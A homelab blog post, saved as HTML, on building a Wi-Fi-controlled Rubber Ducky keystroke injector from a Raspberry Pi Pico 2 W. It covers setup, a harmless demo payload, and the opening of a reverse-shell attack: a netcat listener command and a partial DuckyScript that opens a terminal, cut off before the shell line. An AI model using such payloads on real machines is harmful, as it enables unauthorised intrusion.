@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <title>Create a Rubber Ducky from a Raspberry Pico 2 W</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="preload" as="style" href="../assets/built/screen.css%3Fv=8ba523071e.css">
+    <link rel="preload" as="script" href="../assets/built/source.js%3Fv=8ba523071e">
+    
+    <link rel="preload" as="font" type="font/woff2" href="../assets/fonts/inter-roman.woff2%3Fv=8ba523071e" crossorigin="anonymous">
+<style>
+    @font-face {
+        font-family: "Inter";
+        font-style: normal;
+        font-weight: 100 900;
+        font-display: optional;
+        src: url(../assets/fonts/inter-roman.woff2%3Fv=8ba523071e) format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+</style>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.32.2/tocbot.css">
+    <style>
+.gh-content {
+    position: relative;
+ }
+
+.gh-toc > .toc-list {
+    position: relative;
+}
+
+.toc-list {
+    overflow: hidden;
+    list-style: none;
+}
+
+@media (min-width: 1300px) {
+     .gh-sidebar {
+        position: absolute; 
+        top: 0;
+        bottom: 0;
+        margin-top: 4vmin;
+        grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
+    }
+   
+    .gh-toc {
+        position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
+        top: 4vmin;
+    }
+}
+
+.gh-toc .is-active-link::before {
+    background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
+} 
+</style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=8ba523071e.css">
+
+    <style>
+        :root {
+            --background-color: #ffffff
+        }
+    </style>
+
+    <script>
+        /* The script for calculating the color contrast has been taken from
+        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
+        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
+        accentColor = accentColor.trim().slice(1);
+
+        if (accentColor.length === 3) {
+            accentColor = accentColor[0] + accentColor[0] + accentColor[1] + accentColor[1] + accentColor[2] + accentColor[2];
+        }
+
+        var r = parseInt(accentColor.substr(0, 2), 16);
+        var g = parseInt(accentColor.substr(2, 2), 16);
+        var b = parseInt(accentColor.substr(4, 2), 16);
+        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
+        var textColor = (yiq >= 128) ? 'dark' : 'light';
+
+        document.documentElement.className = `has-${textColor}-text`;
+    </script>
+
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Gianelli HomeLab">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Create a Rubber Ducky from a Raspberry Pico 2 W">
+    <meta property="og:description" content="In this article, I’m going to explain how I built a Rubber Ducky using a Raspberry Pi Pico 2 W.
+
+
+Disclaimer 
+
+This project is for educational purposes only. Use it only on devices you own or have explicit permission to test. Unauthorized use of this tool on other systems">
+    <meta property="og:url" content="https://gianelli.net/create-a-rubber-ducky-from-a-raspberry-pico-2-w/">
+    <meta property="og:image" content="https://gianelli.net/content/images/2025/05/affiche_ducky-3.png">
+    <meta property="article:published_time" content="2025-05-05T21:14:02.000Z">
+    <meta property="article:modified_time" content="2025-05-23T21:18:57.000Z">
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Create a Rubber Ducky from a Raspberry Pico 2 W">
+    <meta name="twitter:description" content="In this article, I’m going to explain how I built a Rubber Ducky using a Raspberry Pi Pico 2 W.
+
+
+Disclaimer 
+
+This project is for educational purposes only. Use it only on devices you own or have explicit permission to test. Unauthorized use of this tool on other systems">
+    <meta name="twitter:url" content="https://gianelli.net/create-a-rubber-ducky-from-a-raspberry-pico-2-w/">
+    <meta name="twitter:image" content="https://gianelli.net/content/images/2025/05/affiche_ducky-3.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Thomas Gianelli">
+    <meta name="twitter:site" content="@ghost">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Gianelli HomeLab",
+        "url": "https://gianelli.net/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://gianelli.net/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Thomas Gianelli",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://gianelli.net/content/images/2025/03/IMG_8286.JPG",
+            "width": 1200,
+            "height": 800
+        },
+        "url": "https://gianelli.net/author/thomas/",
+        "sameAs": []
+    },
+    "headline": "Create a Rubber Ducky from a Raspberry Pico 2 W",
+    "url": "https://gianelli.net/create-a-rubber-ducky-from-a-raspberry-pico-2-w/",
+    "datePublished": "2025-05-05T21:14:02.000Z",
+    "dateModified": "2025-05-23T21:18:57.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://gianelli.net/content/images/2025/05/affiche_ducky-3.png",
+        "width": 1200,
+        "height": 675
+    },
+    "description": "In this article, I’m going to explain how I built a Rubber Ducky using a Raspberry Pi Pico 2 W.\n\n\nDisclaimer \n\nThis project is for educational purposes only. Use it only on devices you own or have explicit permission to test. Unauthorized use of this tool on other systems may be illegal.\n\n\nOverview\n\n\nRaspberry Pico 2 W\n\nThe Raspberry Pi Pico 2 W is a compact and affordable microcontroller from Raspberry Pi. It’s powered by the RP2350 chip and includes built-in Wi-Fi, which makes it a great optio",
+    "mainEntityOfPage": "https://gianelli.net/create-a-rubber-ducky-from-a-raspberry-pico-2-w/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.111">
+    <link rel="alternate" type="application/rss+xml" title="Gianelli HomeLab" href="../rss/index.html">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.50/umd/portal.min.js" data-i18n="true" data-ghost="https://gianelli.net/" data-key="b84960009d78b6fc8be0675c52" data-api="https://gianelli.net/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="b84960009d78b6fc8be0675c52" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://gianelli.net/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://gianelli.net/webmentions/receive/" rel="webmention">
+    <script defer src="../public/cards.min.js%3Fv=8ba523071e"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=8ba523071e.css">
+    <script defer src="../public/member-attribution.min.js%3Fv=8ba523071e"></script><style>:root {--ghost-accent-color: #2f3880;}</style>
+    <style>
+.reading-progress {
+  position: fixed;
+  top: 0;
+  z-index: 999;
+  width: 100%;
+  height: 5px; /* Progress bar height */
+  background: #c5d2d9; /* Progress bar background color */
+  -webkit-appearance: none;
+     -moz-appearance: none;
+          appearance: none; /* Hide default progress bar */
+}
+
+.reading-progress::-webkit-progress-bar {
+  background-color: transparent;
+}
+
+.reading-progress::-webkit-progress-value {
+  background: var(--ghost-accent-color); /* Progress bar color */
+}
+</style>
+
+
+<script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/autoloader/prism-autoloader.min.js" defer></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism.min.css">
+<style>
+  pre[class*="language-"] {
+      font-size: 0.9em;
+  }
+</style>
+
+</head>
+<body class="post-template has-sans-title has-sans-body">
+
+<div class="gh-viewport">
+    
+    <header id="gh-navigation" class="gh-navigation is-middle-logo gh-outer">
+    <div class="gh-navigation-inner gh-inner">
+
+        <div class="gh-navigation-brand">
+            <a class="gh-navigation-logo is-title" href="../index.html">
+                    Gianelli HomeLab
+            </a>
+            <button class="gh-search gh-icon-button" aria-label="Search this site" data-ghost-search>
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>            <button class="gh-burger gh-icon-button" aria-label="Menu">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg>                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M205.66,194.34a8,8,0,0,1-11.32,11.32L128,139.31,61.66,205.66a8,8,0,0,1-11.32-11.32L116.69,128,50.34,61.66A8,8,0,0,1,61.66,50.34L128,116.69l66.34-66.35a8,8,0,0,1,11.32,11.32L139.31,128Z"></path></svg>            </button>
+        </div>
+
+        <nav class="gh-navigation-menu">
+            <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about-me"><a href="../about/index.html">About me</a></li>
+</ul>
+
+        </nav>
+
+        <div class="gh-navigation-actions">
+                <button class="gh-search gh-icon-button" aria-label="Search this site" data-ghost-search>
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>                <div class="gh-navigation-members">
+                            <a href="index.html#/portal/signin" data-portal="signin">Sign in</a>
+                                <a class="gh-button" href="index.html#/portal/signup" data-portal="signup">Subscribe</a>
+                </div>
+        </div>
+
+    </div>
+</header>
+
+    <progress class="reading-progress" value="0" max="100" aria-label="Reading progress"></progress>
+
+
+
+<main class="gh-main">
+
+    <article class="gh-article post">
+
+        <header class="gh-article-header gh-canvas">
+
+            <h1 class="gh-article-title is-title">Create a Rubber Ducky from a Raspberry Pico 2 W</h1>
+
+            <div class="gh-article-meta">
+                <div class="gh-article-author-image instapaper_ignore">
+                            <a href="../author/thomas/index.html">
+                                <img class="author-profile-image" src="../content/images/size/w160/2025/03/IMG_8286.JPG" alt="Thomas Gianelli">
+                            </a>
+                </div>
+                <div class="gh-article-meta-wrapper">
+                    <h4 class="gh-article-author-name"><a href="../author/thomas/index.html">Thomas Gianelli</a></h4>
+                    <div class="gh-article-meta-content">
+                        <time class="gh-article-meta-date" datetime="2025-05-05">05 May 2025</time>
+                            <span class="gh-article-meta-length"><span class="bull">—</span> 11 min read</span>
+                    </div>
+                </div>
+            </div>
+
+                <figure class="gh-article-image">
+        <img
+            srcset="../content/images/size/w320/2025/05/affiche_ducky-3.png 320w,
+                   ../content/images/size/w600/2025/05/affiche_ducky-3.png 600w,
+                  ../content/images/size/w960/2025/05/affiche_ducky-3.png 960w,
+                 ../content/images/size/w1200/2025/05/affiche_ducky-3.png 1200w,
+                ../content/images/size/w2000/2025/05/affiche_ducky-3.png 2000w"
+            sizes="(max-width: 1200px) 100vw, 1120px"
+            src="../content/images/size/w1200/2025/05/affiche_ducky-3.png"
+            alt="Create a Rubber Ducky from a Raspberry Pico 2 W"
+        >
+    </figure>
+
+        </header>
+
+        <section class="gh-content gh-canvas is-body">
+            <p>In this article, I’m going to explain how I built a Rubber Ducky using a Raspberry Pi Pico 2 W.</p><h2 id="disclaimer">Disclaimer&nbsp;</h2><p>This project is for educational purposes only. Use it only on devices you own or have explicit permission to test. Unauthorized use of this tool on other systems may be illegal.</p><h2 id="overview">Overview</h2><h3 id="raspberry-pico-2-w">Raspberry Pico 2 W</h3><p>The Raspberry Pi Pico 2 W is a compact and affordable microcontroller from Raspberry Pi. It’s powered by the RP2350 chip and includes built-in Wi-Fi, which makes it a great option for small connected projects or automation tasks.</p><h3 id="rubber-ducky">Rubber Ducky</h3><p>A Rubber Ducky is a device that looks like a regular USB stick but acts like a keyboard when plugged into a computer. It can automatically type and run commands very quickly, which makes it useful for automating tasks, or for security testing and hacking.</p><p>One of the key features of the Raspberry Pi Pico 2 W is that it can act as a USB HID (Human Interface Device), like a keyboard or mouse. This means it can send keystrokes to a connected computer, just like a Rubber Ducky. So in this article, we’re going to see how to do that.</p><h2 id="required-materials">Required Materials:</h2><ul><li>A Raspberry Pi Pico 2 W</li><li>A Micro USB cable</li><li>A computer</li><li>Another Wi-Fi enabled device (computer, tablet, smartphone...)</li></ul><h2 id="firmware-installation">Firmware Installation </h2><p>The first step is to install the CircuitPython firmware on your Raspberry Pi Pico. To do this, visit the official website,&nbsp;and download the firmware. Personally, I’m using version 9.2.7.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://circuitpython.org/board/raspberry_pi_pico2_w/?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CircuitPython - Pico 2 W Download</div><div class="kg-bookmark-description">Raspberry Pi Pico 2W is Raspberry Pi Foundation’s update to their popular RP2040-based wireless ico board, now built on RP2350: their new high-performance, secure microcontroller. With a higher core clock speed, double the on-chip SRAM (512KB), double the on-board flash memory (4MB!), more powerf…</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/mstile-144x144.png" alt=""><span class="kg-bookmark-author">CircuitPython Logo</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/raspberry_pi_pico2_w.jpg" alt="" onerror="this.style.display = 'none'"></div></a></figure><p>Next, connect your Raspberry Pi while holding the BOOTSEL button, then release it. A drive named "rp2350" will be detected. Simply drag and drop the previously downloaded file onto this drive. The "rp2350" drive will be automatically ejected, and a new drive named "CIRCUITPY" will appear.</p><h2 id="project-structure">Project Structure</h2><p>On this new drive, you should see a file named&nbsp;<code>code.py</code>. This is the main file of the project. Any code written in this file will run automatically as soon as the Raspberry Pi is plugged into a computer.  This is also the file where we define our Wi-Fi access point, the IP address where the web server will be accessible, and the routes that will handle the different requests.</p><p>All the necessary files and directories for this project are available on my GitHub. You can simply copy and paste them from there to set everything up easily.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/GianelliT/Pico-WIFI-Duck?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - GianelliT/Pico-WIFI-Duck: Transform your Raspberry Pi Pico W into a WIFI Rubber Ducky</div><div class="kg-bookmark-description">Transform your Raspberry Pi Pico W into a WIFI Rubber Ducky - GianelliT/Pico-WIFI-Duck</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/pinned-octocat-093da3e6fa40.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">GianelliT</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/Pico-WIFI-Duck" alt="" onerror="this.style.display = 'none'"></div></a></figure><h3 id="librairies">Librairies</h3><p>To build this project, we need to install a few additional libraries on the microcontroller. These are&nbsp;<code>adafruit_hid</code>&nbsp;and&nbsp;<code>adafruit_httpserver</code>.<br>The first one is used to inject commands through the keyboard, while the second allows the Raspberry Pi to create a Wi-Fi network when plugged in.</p><p>You can download the libraries from the official website. Make sure to choose the version that matches your CircuitPython version. Once downloaded, create a folder named&nbsp;<code>lib</code>&nbsp;on your Raspberry Pi, and copy the&nbsp;<code>adafruit_hid</code> and <code>adafruit_httpserver</code>&nbsp;folders into it.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://circuitpython.org/libraries?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CircuitPython - Libraries</div><div class="kg-bookmark-description">The easiest way to program microcontrollers</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/mstile-144x144-1.png" alt=""><span class="kg-bookmark-author">CircuitPython Logo</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/CircuitPythonLogo_Black.png" alt="" onerror="this.style.display = 'none'"></div></a></figure><h3 id="the-web-server">The web server</h3><p>Since a web server is being created, we also need an HTML file. The&nbsp;<code>index.html</code>&nbsp;file contains all the code for the web page, including the CSS. This page will be accessible from a local IP address on the Wi-Fi network created by the Raspberry Pi. In this case, the address is&nbsp;<code>192.168.4.1</code>.</p><h3 id="the-parser">The parser</h3><p>To execute the code we want to inject, we need to use a parser. That’s the role of the&nbsp;<code>duck.py</code>&nbsp;file. It scans the user input to recognize tokens that correspond to instructions, keyboard shortcuts, and text strings.</p><h3 id="payloads">Payloads</h3><p>To make using the Rubber Ducky easier, we use a folder called&nbsp;<code>payloads</code>. This allows us to prepare scripts in advance, save them in this folder, and load them directly once the Raspberry Pi is plugged in. That way, there's no need to rewrite the scripts every time you want to run them on a target machine.</p><h2 id="adjusting-the-keyboard-layout">Adjusting the keyboard layout</h2><p>When the program injects your code, it types it as if it were coming from the keyboard of the target machine. This means you may need to adjust the keyboard layout in your code. Personally, I use a French MacBook with an Apple AZERTY keyboard. I’ll show you how to adapt your code accordingly. <br>First, go to this GitHub page:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/tree/main?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - Neradoc/Circuitpython_Keyboard_Layouts: A repository of keyboard layouts for Circuitpython, for HID keyboards over USB or BLE.</div><div class="kg-bookmark-description">A repository of keyboard layouts for Circuitpython, for HID keyboards over USB or BLE. - Neradoc/Circuitpython_Keyboard_Layouts</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/pinned-octocat-093da3e6fa40-1.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">Neradoc</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/Circuitpython_Keyboard_Layouts" alt="" onerror="this.style.display = 'none'"></div></a></figure><p>In the libraries folder, download the files that match your keyboard layout. You’ll need both the layout and the keycodes files. Then, copy these two files into the&nbsp;<code>lib &gt; adafruit_hid</code>&nbsp;folder on your Raspberry Pi.<br><br>Now, in the library imports at the top of your&nbsp;<code>duck.py</code>&nbsp;file, update them to match the layout you’re using.<br>For example, here’s what I use:</p><pre><code class="language-python">from adafruit_hid.keyboard_layout_mac_fr import KeyboardLayout
+from adafruit_hid.keycode_mac_fr import Keycode</code></pre><p>If you’re using other libraries with functions that have different names, you’ll also need to adjust these two lines a bit further down in the file:</p><pre><code class="language-python">kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayout(kbd)
+</code></pre><h2 id="features-and-proof-of-concept">Features and Proof of Concept</h2><h3 id="access-to-the-web-server">Access to the web server</h3><p>In my main file,&nbsp;<code>code.py</code>, I define the Wi-Fi access point like this:</p><pre><code class="language-python">ssid = "Pico WIFI DUCK"
+password = "pico123456"</code></pre><p>The&nbsp;<code>ssid</code>&nbsp;is the name of the Wi-Fi network and can be changed freely. You can also change the password, but it must be at least 8 characters long.</p><figure class="kg-card kg-image-card"><img src="../content/images/2025/05/IMG_0120.jpg" class="kg-image" alt="" loading="lazy" width="1455" height="530" srcset="../content/images/size/w600/2025/05/IMG_0120.jpg 600w, ../content/images/size/w1000/2025/05/IMG_0120.jpg 1000w, ../content/images/2025/05/IMG_0120.jpg 1455w" sizes="(min-width: 720px) 720px"></figure><p>In this screenshot, you can see that my Wi-Fi network was successfully created and that I was able to connect to it by entering the password.</p><p>In the same file, I also set the IP address where the web server will be accessible:</p><pre><code class="language-python">server.serve_forever('192.168.4.1', 80)</code></pre><p>The number&nbsp;<code>80</code>&nbsp;refers to the port, which is the default port used for HTTP connections.</p><figure class="kg-card kg-image-card"><img src="../content/images/2025/05/IMG_0121.PNG" class="kg-image" alt="" loading="lazy" width="2000" height="1500" srcset="../content/images/size/w600/2025/05/IMG_0121.PNG 600w, ../content/images/size/w1000/2025/05/IMG_0121.PNG 1000w, ../content/images/size/w1600/2025/05/IMG_0121.PNG 1600w, ../content/images/2025/05/IMG_0121.PNG 2224w" sizes="(min-width: 720px) 720px"></figure><p>As shown in the screenshot, all I need to do is open a web browser and type the IP address into the address bar. This brings me to the web page, which is coded in the <code>index.html</code>&nbsp;file. </p><h3 id="features">Features</h3><p>The main feature is the payload editor. It looks like a simple code editor where you can write the code that will be executed on the target machine. The commands should be written in DuckyScript. Not all commands are supported, but if you want to learn more about the language, you can check out the official documentation.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">DuckyScript™ Quick Reference | USB Rubber Ducky</div><div class="kg-bookmark-description">DuckyScript™ is the programming language of the USB Rubber Ducky™, Hak5® hotplug attack gear and officially licensed devices (Trademark Hak5 LLC. Copyright © 2010 Hak5 LLC. All rights reserved.)</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/image" alt=""><span class="kg-bookmark-author">USB Rubber Ducky</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/image" alt="" onerror="this.style.display = 'none'"></div></a></figure><p>Once the payload is written, all you have to do is click the&nbsp;<strong>Run</strong>&nbsp;button, and it will be executed immediately on the target machine.</p><p>You also have the option to click the&nbsp;<strong>Save</strong>&nbsp;button. This will download a text file to your device containing the code currently in the editor. It’s a handy way to save a payload and reuse it later.</p><p>In the top right corner of the editor, there are also two additional buttons. The first one clears the current content in the editor, allowing you to start writing a new payload from scratch. The second one copies the code in the editor to your clipboard.</p><p>Now let’s look at what is probably the most interesting part: the preloaded payloads. If you click the&nbsp;<strong>Select saved payload</strong>&nbsp;button, you’ll see a list of the payloads you’ve stored in the&nbsp;<code>payloads</code>&nbsp;folder on the Raspberry Pi. Just select the one you want and click&nbsp;<strong>Load</strong>. The content of the payload will then appear in the editor. From there, you can make any specific changes if needed, and then click&nbsp;<strong>Run</strong>&nbsp;to execute it.<br>This allows you to prepare different scenarios in advance and have ready-to-use attacks as soon as you plug in your Raspberry Pi.</p><p>Finally, in the top right corner of the page, an indicator shows the connection status with your Raspberry Pi.</p><h3 id="demonstration">Demonstration</h3><p>To test our Rubber Ducky, what better than a simple “Hello World!”?<br>To do this, we’ll write the following code in the editor. This code is also available directly in the preloaded payloads.</p><pre><code class="language-DuckyScript">DEFAULTDELAY 100
+GUI space
+STRING TextEdit 
+ENTER
+DELAY 1000
+GUI N
+DELAY 1100
+STRING Hello world !
+GUI A
+GUI B
+GUI +
+REPEAT 10
+RIGHT</code></pre><p>I start by setting the default delay between commands to 100ms. The&nbsp;<code>GUI</code>&nbsp;command corresponds to the Start key in a Windows environment and to the Command key on a Mac. Here, I use it to open Spotlight with a keyboard shortcut, then type and open TextEdit.<br>I wait a bit longer, then create a new document. Again, I increase the delay to make sure the document is open before editing it.<br>Now I type "Hello world!", select the text, make it bold, and increase the font size ten times. Finally, I use the right arrow command to deselect the text.</p><p>All I have to do now is click the&nbsp;<strong>Run</strong>&nbsp;button, and here’s what happens on my Mac.</p><figure class="kg-card kg-video-card kg-width-regular" data-kg-thumbnail="https://gianelli.net/content/media/2025/05/demo_thumb.jpg" data-kg-custom-thumbnail="">
+            <div class="kg-video-container">
+                <video src="../content/media/2025/05/demo.mp4" poster="https://img.spacergif.org/v1/2338x1530/0a/spacer.png" width="2338" height="1530" loop="" autoplay="" muted="" playsinline="" preload="metadata" style="background: transparent url('../content/media/2025/05/demo_thumb.jpg') 50% 50% / cover no-repeat;"></video>
+                <div class="kg-video-overlay">
+                    <button class="kg-video-large-play-icon" aria-label="Play video">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path d="M23.14 10.608 2.253.164A1.559 1.559 0 0 0 0 1.557v20.887a1.558 1.558 0 0 0 2.253 1.392L23.14 13.393a1.557 1.557 0 0 0 0-2.785Z"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="kg-video-player-container kg-video-hide">
+                    <div class="kg-video-player">
+                        <button class="kg-video-play-icon" aria-label="Play video">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M23.14 10.608 2.253.164A1.559 1.559 0 0 0 0 1.557v20.887a1.558 1.558 0 0 0 2.253 1.392L23.14 13.393a1.557 1.557 0 0 0 0-2.785Z"></path>
+                            </svg>
+                        </button>
+                        <button class="kg-video-pause-icon kg-video-hide" aria-label="Pause video">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <rect x="3" y="1" width="7" height="22" rx="1.5" ry="1.5"></rect>
+                                <rect x="14" y="1" width="7" height="22" rx="1.5" ry="1.5"></rect>
+                            </svg>
+                        </button>
+                        <span class="kg-video-current-time">0:00</span>
+                        <div class="kg-video-time">
+                            /<span class="kg-video-duration">0:09</span>
+                        </div>
+                        <input type="range" class="kg-video-seek-slider" max="100" value="0">
+                        <button class="kg-video-playback-rate" aria-label="Adjust playback speed">1×</button>
+                        <button class="kg-video-unmute-icon" aria-label="Unmute">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M15.189 2.021a9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h1.794a.249.249 0 0 1 .221.133 9.73 9.73 0 0 0 7.924 4.85h.06a1 1 0 0 0 1-1V3.02a1 1 0 0 0-1.06-.998Z"></path>
+                            </svg>
+                        </button>
+                        <button class="kg-video-mute-icon kg-video-hide" aria-label="Mute">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M16.177 4.3a.248.248 0 0 0 .073-.176v-1.1a1 1 0 0 0-1.061-1 9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h.114a.251.251 0 0 0 .177-.073ZM23.707 1.706A1 1 0 0 0 22.293.292l-22 22a1 1 0 0 0 0 1.414l.009.009a1 1 0 0 0 1.405-.009l6.63-6.631A.251.251 0 0 1 8.515 17a.245.245 0 0 1 .177.075 10.081 10.081 0 0 0 6.5 2.92 1 1 0 0 0 1.061-1V9.266a.247.247 0 0 1 .073-.176Z"></path>
+                            </svg>
+                        </button>
+                        <input type="range" class="kg-video-volume-slider" max="100" value="100">
+                    </div>
+                </div>
+            </div>
+            
+        </figure><p>You can clearly see how fast the commands are executed!</p><h3 id="a-more-advanced-attack">A More Advanced Attack</h3><p><br>Now that we’re familiar with how the Rubber Ducky works, let’s see how we can use a simple script to build an attack scenario with the goal of obtaining a reverse shell on a machine.</p><p>⚠️ Again, this is for educational purposes only. It is strictly forbidden to use such a tool on any machine without the owner’s permission. ⚠️</p><p>The first step is to prepare the listening machine, the one that will receive the shell from the target machine.<br>In this case, I’ll place it on the same network as the target. An even more powerful option would be to assign a public IP address to this machine. That way, we wouldn’t need to have a device directly on the target’s network. While this is a more advanced setup, our is still a realistic scenario.</p><p>On the listening machine, I run&nbsp;<code>ip a</code>&nbsp;to get its IP address, then launch the following command:</p><pre><code class="language-bash">nc -l -p 4444</code></pre><p>This is a Netcat command. The&nbsp;<code>-l</code>&nbsp;option specifies that the machine is in listening mode, meaning it’s waiting for an incoming connection. The&nbsp;<code>-p</code>&nbsp;option allows you to define the port — here, I’ve chosen port 4444, but you can use any other port if you prefer.</p><p>Now, all we have to do is plug in our Rubber Ducky on the target machine and run the following script. Of course, you’ll need to adjust the IP address to match the one of your listening machine.</p><pre><code class="language-Duckyscript">DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
